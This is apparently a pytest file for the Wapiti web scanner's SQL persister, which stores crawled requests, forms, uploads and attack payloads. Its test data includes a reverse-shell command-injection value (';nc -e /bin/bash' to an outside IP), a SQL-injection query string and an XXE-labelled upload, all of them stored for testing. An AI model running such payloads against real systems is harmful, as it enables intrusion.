import os
import json

import pytest
import httpx
import respx

from wapitiCore.net.classes import CrawlerConfiguration
from wapitiCore.parsers.html_parser import Html
from wapitiCore.net.sql_persister import SqlPersister
from wapitiCore.net import Request
from wapitiCore.net.crawler import AsyncCrawler, Response


@pytest.mark.asyncio
@respx.mock
async def test_persister_basic():
    url = "http://httpbin.org/?k=v"
    respx.get(url).mock(return_value=httpx.Response(200, text="Hello world!"))

    crawler_configuration = CrawlerConfiguration(Request("http://httpbin.org/"))
    async with AsyncCrawler.with_configuration(crawler_configuration) as crawler:
        try:
            os.unlink("/tmp/crawl.db")
        except FileNotFoundError:
            pass

        persister = SqlPersister("/tmp/crawl.db")
        await persister.create()
        await persister.set_root_url("http://httpbin.org/")

        simple_get = Request("http://httpbin.org/?k=v")

        simple_post = Request(
            "http://httpbin.org/post?var1=a&var2=b",
            post_params=[["post1", "c"], ["post2", "d"]]
        )
        await persister.set_to_browse([simple_get, simple_post])

        assert await persister.get_root_url() == "http://httpbin.org/"
        assert await persister.count_paths() == 2
        assert not [__ async for __ in persister.get_links()]
        assert not [__ async for __ in persister.get_forms()]
        assert not [__ async for __ in persister.get_payloads()]

        stored_requests = set([__ async for __ in persister.get_to_browse()])
        assert simple_get in stored_requests
        assert simple_post in stored_requests

        # If there is some requests stored then it means scan was started
        assert await persister.has_scan_started()
        assert not await persister.has_scan_finished()
        assert not await persister.have_attacks_started()

        for req in stored_requests:
            if req == simple_get:
                await crawler.async_send(req)
                # Add the sent request
                await persister.save_request(req)
                assert req.path_id == 1
                assert await persister.get_path_by_id(1) == req
                break

        # Should be one now as the link was crawled
        assert len([__ async for __ in persister.get_links()]) == 1
        # We still have two entries in paths though as the resource just got updated
        assert await persister.count_paths() == 2

        await persister.set_attacked([1], "xss")
        assert await persister.count_attacked("xss") == 1
        assert await persister.have_attacks_started()

        naughty_get = Request("http://httpbin.org/?k=1%20%OR%200")

        await persister.add_payload(
            1,  # request_id
            "vulnerability",  # payload_type
            "sql",  # module
            "SQL Injection",  # category
            1,  # level
            naughty_get,  # request
            "k",  # parameter
            "OR bypass"  # info
        )

        assert [__ async for __ in persister.get_payloads()]
        await persister.flush_attacks()
        assert not await persister.have_attacks_started()
        assert not [__ async for __ in persister.get_payloads()]
        await persister.flush_session()
        assert not await persister.count_paths()

        naughty_post = Request(
            "http://httpbin.org/post?var1=a&var2=b",
            post_params=[["post1", "c"], ["post2", ";nc -e /bin/bash 9.9.9.9 9999"]]
        )

        await persister.add_payload(
            1,  # request_id
            "vulnerability",  # payload_type
            "exec",  # module
            "Command Execution",  # category
            1,  # level
            naughty_post,  # request
            "post2",  # parameter
            ";nc -e /bin/bash 9.9.9.9 9999"  # info
        )
        payload = [__ async for __ in persister.get_payloads()][0]
        await persister.close()
        assert naughty_post == payload.evil_request
        assert payload.parameter == "post2"


@pytest.mark.asyncio
@respx.mock
async def test_persister_upload():
    try:
        os.unlink("/tmp/crawl.db")
    except FileNotFoundError:
        pass

    persister = SqlPersister("/tmp/crawl.db")
    await persister.create()
    await persister.set_root_url("http://httpbin.org/")

    simple_upload = Request(
        "http://httpbin.org/post?qs1",
        post_params=[["post1", "c"], ["post2", "d"]],
        file_params=[["file1", ("'fname1", b"content", "text/plain")], ["file2", ("fname2", b"content", "text/plain")]]
    )

    xml_upload = Request(
        "http://httpbin.org/post?qs1",
        post_params=[["post1", "c"], ["post2", "d"]],
        file_params=[["calendar", ("calendar.xml", b"<xml>Hello there</xml>", "application/xml")]]
    )
    await persister.save_request(simple_upload)
    await persister.save_request(xml_upload)
    assert await persister.count_paths() == 2
    stored_requests = set([__ async for __ in persister.get_to_browse()])
    assert simple_upload in stored_requests
    assert xml_upload in stored_requests

    respx.post("http://httpbin.org/post?qs1").mock(return_value=httpx.Response(200, text="Hello there"))
    crawler_configuration = CrawlerConfiguration(Request("http://httpbin.org/"))
    async with AsyncCrawler.with_configuration(crawler_configuration) as crawler:
        for req in stored_requests:
            await crawler.async_send(req)
            await persister.save_request(req)

            if req == simple_upload:
                assert req.file_params == simple_upload.file_params
                assert req.file_params[0] == ["file1", ("'fname1", b"content", "text/plain")]
                assert req.file_params[1] == ["file2", ("fname2", b"content", "text/plain")]
            else:
                assert req.file_params == xml_upload.file_params
                assert req.file_params[0] == ["calendar", ("calendar.xml", b"<xml>Hello there</xml>", "application/xml")]

        naughty_file = Request(
            "http://httpbin.org/post?qs1",
            post_params=[["post1", "c"], ["post2", "d"]],
            file_params=[["calendar", ("calendar.xml", b"<xml>XXE there</xml>", "application/xml")]]
        )

        await persister.add_payload(
            1,  # request_id
            "vulnerability",  # payload_type
            "exec",  # module
            "Command Execution",  # category
            1,  # level
            naughty_file,  # request
            "calendar",  # parameter
            "<xml>XXE there</xml>"  # info
        )
        payload = [__ async for __ in persister.get_payloads()][0]
        assert naughty_file == payload.evil_request
        assert payload.parameter == "calendar"
        assert len([__ async for __ in persister.get_forms(path="http://httpbin.org/post")]) == 2


@pytest.mark.asyncio
@respx.mock
async def test_persister_forms():
    with open("tests/data/forms.html") as data_body:
        url = "http://perdu.com/"
        respx.get(url).mock(return_value=httpx.Response(200, text=data_body.read()))

        resp = httpx.get(url, follow_redirects=False)
        page = Html(Response(resp).content, url)

        forms = list(page.iter_forms())

        try:
            os.unlink("/tmp/crawl.db")
        except FileNotFoundError:
            pass

        persister = SqlPersister("/tmp/crawl.db")
        await persister.create()
        await persister.set_root_url("http://httpbin.org/")
        await persister.set_to_browse(forms)

        assert await persister.count_paths() == 9

        extracted_forms = [__ async for __ in persister.get_to_browse()]
        assert len(extracted_forms) == 9
        assert set(forms) == set(extracted_forms)

        for form in extracted_forms:
            if form.file_path == "/upload.php":
                assert form.file_params[0] == ["file", ("pix.gif", b"GIF89a", "image/gif")]
            elif form.file_path == "/fields.php":
                assert ["file", "pix.gif"] in form.post_params


@pytest.mark.asyncio
async def test_raw_post():
    json_req = Request(
        "http://httpbin.org/post?a=b",
        post_params=json.dumps({"z": 1, "a": 2}),
        enctype="application/json"
    )

    try:
        os.unlink("/tmp/crawl.db")
    except FileNotFoundError:
        pass

    persister = SqlPersister("/tmp/crawl.db")
    await persister.create()
    await persister.set_root_url("http://httpbin.org/")
    await persister.set_to_browse([json_req])
    assert await persister.count_paths() == 1

    extracted = [__ async for __ in persister.get_to_browse()][0]
    assert json_req == extracted
    assert json.loads(extracted.post_params) == {"z": 1, "a": 2}

    naughty_json = Request(
        "http://httpbin.org/post?a=b",
        post_params=json.dumps({"z": "I'm a naughty value", "a": 2}),
        enctype="application/json"
    )
    await persister.add_payload(
        1,  # request_id
        "vulnerability",  # payload_type
        "exec",  # module
        "Command Execution",  # category
        1,  # level
        naughty_json,  # request
        "z",  # parameter
        "I'm a naughty value"  # info
    )
    payload = [__ async for __ in persister.get_payloads()][0]
    assert naughty_json == payload.evil_request
    assert payload.parameter == "z"
